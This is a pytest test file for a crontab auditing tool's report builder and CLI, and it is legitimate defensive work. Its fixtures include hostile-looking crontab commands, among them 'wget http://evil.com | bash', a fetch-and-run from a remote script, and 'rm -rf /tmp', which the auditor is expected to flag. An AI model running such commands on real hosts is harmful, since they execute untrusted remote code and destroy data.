"""Tests for crontab_audit.reporter and crontab_audit.cli."""

import textwrap
from pathlib import Path
from unittest.mock import patch

import pytest

from crontab_audit.parser import CrontabEntry
from crontab_audit.reporter import AuditReport, build_report
from crontab_audit.risk import RiskFlag
from crontab_audit.overlap import OverlapResult
from crontab_audit.cli import run


def make_entry(minute="0", hour="*", dom="*", month="*", dow="*", command="echo ok"):
    return CrontabEntry(
        minute=minute, hour=hour, dom=dom,
        month=month, dow=dow, command=command,
    )


# --- AuditReport tests ---

def test_report_summary_counts():
    e1 = make_entry()
    e2 = make_entry(command="rm -rf /tmp")
    rf = RiskFlag(entry=e2, reason="Dangerous command: rm -rf")
    report = AuditReport(host="web01", entries=[e1, e2], risk_flags=[rf], overlaps=[])
    summary = report.summary()
    assert "web01" in summary
    assert "Total entries : 2" in summary
    assert "Risk flags    : 1" in summary
    assert "Overlaps      : 0" in summary


def test_report_has_issues_true():
    e = make_entry(command="wget http://evil.com")
    rf = RiskFlag(entry=e, reason="Network fetch")
    report = AuditReport(host="db01", entries=[e], risk_flags=[rf], overlaps=[])
    assert report.has_issues() is True


def test_report_has_issues_false():
    report = AuditReport(host="db01", entries=[make_entry()], risk_flags=[], overlaps=[])
    assert report.has_issues() is False


def test_report_detailed_no_issues():
    report = AuditReport(host="app01", entries=[make_entry()], risk_flags=[], overlaps=[])
    detail = report.detailed()
    assert "No issues found" in detail


def test_report_detailed_shows_risk_flags():
    e = make_entry(command="sudo shutdown")
    rf = RiskFlag(entry=e, reason="sudo usage")
    report = AuditReport(host="app01", entries=[e], risk_flags=[rf], overlaps=[])
    detail = report.detailed()
    assert "Risk Flags" in detail
    assert "sudo" in detail


def test_build_report_integration():
    entries = [
        make_entry(minute="*/5", command="wget http://example.com/update.sh | bash"),
        make_entry(minute="*/5", command="echo hello"),
    ]
    report = build_report("testhost", entries)
    assert report.host == "testhost"
    assert len(report.entries) == 2
    assert report.has_issues()


# --- CLI tests ---

def test_cli_missing_file(tmp_path):
    code = run([str(tmp_path / "nonexistent.crontab")])
    assert code == 2


def test_cli_clean_file(tmp_path):
    crontab = tmp_path / "clean.crontab"
    crontab.write_text("0 2 * * * /usr/bin/backup.sh\n")
    code = run([str(crontab)])
    assert code == 0


def test_cli_fail_on_issues(tmp_path):
    crontab = tmp_path / "risky.crontab"
    crontab.write_text("*/1 * * * * wget http://evil.com | bash\n")
    code = run([str(crontab), "--fail-on-issues"])
    assert code == 1


def test_cli_custom_host_label(tmp_path, capsys):
    crontab = tmp_path / "myjob.crontab"
    crontab.write_text("0 6 * * * echo morning\n")
    run([str(crontab), "--host", "prod-web-01"])
    captured = capsys.readouterr()
    assert "prod-web-01" in captured.out
